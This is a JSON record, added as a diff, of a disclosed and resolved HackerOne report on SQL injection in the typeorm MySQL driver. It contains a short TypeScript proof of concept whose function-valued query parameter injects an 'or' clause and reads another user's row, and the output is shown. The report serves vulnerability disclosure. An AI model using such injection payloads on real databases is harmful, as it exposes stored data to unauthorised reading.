@@ -1,0 +1,136 @@
+{
+  "id": 506654,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDY2NTQ=",
+  "url": "https://hackerone.com/reports/506654",
+  "title": "[typeorm] SQL Injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-03-08T07:49:04.488Z",
+  "submitted_at": "2019-03-08T07:49:04.488Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "verichains",
+    "url": "/verichains",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-04-02T04:25:24.379Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-04-02T04:25:24.298Z",
+  "team_member_agreed_on_going_public_at": "2019-03-31T01:59:41.403Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report SQL Injection in typeorm.\nIt allows reading data from database.\n\n# Module\n\n**module name:** typeorm\n**version:** 0.2.14\n**npm page:** `https://www.npmjs.com/package/typeorm`\n\n## Module Description\n\n> TypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8). Its goal is to always support the latest JavaScript features and provide additional features that help you to develop any kind of application that uses databases - from small applications with a few tables to large scale enterprise applications with multiple databases.\n\n> TypeORM supports both Active Record and Data Mapper patterns, unlike all other JavaScript ORMs currently in existence, which means you can write high quality, loosely coupled, scalable, maintainable applications the most productive way.\n\n\n\n## Module Stats\n\n> Replace stats below with numbers from npm’s module page:\n\n79,749 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nMethod `escapeQueryWithParameters` of `MysqlDriver.ts` directly return value from parameter if it is a function without escaping which allow attacker to perform SQL Injection in specialized context.\nhttps://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/src/driver/mysql/MysqlDriver.ts#L387\n\n```ts\n            if (value instanceof Function) {\n                return value();\n\n            } else {\n                escapedParameters.push(value);\n                return \"?\";\n            }\n```\n\nI'm not sure if this is intended or not, there's no information in the document, if someone used this pattern (value provided by a function callback) it will lead to sql injection attack.\n\n\n## Steps To Reproduce:\n\n- Create a new test typeorm package\n```bash\nnpx typeorm init --name Test --database mysql\n```\n\n- Edit `ormconfig.json` for local credentials.\n\nModify `index.ts` to test the injection:\n\n```ts\nimport \"reflect-metadata\";\nimport {createConnection} from \"typeorm\";\nimport {User} from \"./entity/User\";\n\ncreateConnection().then(async connection => {\n\n    console.log(\"Inserting a new user into the database...\");\n\n    for(var i=0;i<10;i++) {\n        const user = new User();\n        user.firstName = `Timber ${i}`;\n        user.lastName = \"Saw\";\n        user.age = 25 + i;\n        await connection.manager.save(user);\n        console.log(\"Saved a new user with id: \" + user.id);\n    }\n\n    const repo = connection.getRepository(User);\n\n    console.log(await repo.createQueryBuilder().where('firstName = :name', {name: () => \"-1 or firstName=0x54696d6265722033\"}).getOne());\n\n    process.exit(0);\n}).catch(error => console.log(error));\n```\n(0x54696d6265722033 is \"Timber 3\")\n\nOutput:\n```\nInserting a new user into the database...\nUser { id: 5, firstName: 'Timber 3', lastName: 'Saw', age: 28 }\n```\n\n## Supporting Material/References:\n\n> State all technical information about the stack where the vulnerability was found\n\n- MacOs\n- NodeJS v8.12.0\n- npm 6.4.1\n\n# Wrap up\n\n> Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nAllow attackers to perform SQL Injection attacks.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-04-30T01:59:41.508Z",
+  "allow_singular_disclosure_after": -221750575.0690063,
+  "singular_disclosure_allowed": true,
+  "vote_count": 15,
+  "voters": [
+    "khizer47",
+    "persistence_not_wizardry",
+    "rmendelovits",
+    "adnanslef",
+    "bb70e01c1f9891a1d35d0fb",
+    "yuanyuan",
+    "rutger77",
+    "hightechsec",
+    "bd9db035bc51541980bcd85",
+    "hdrnn",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 6411,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "typeorm",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
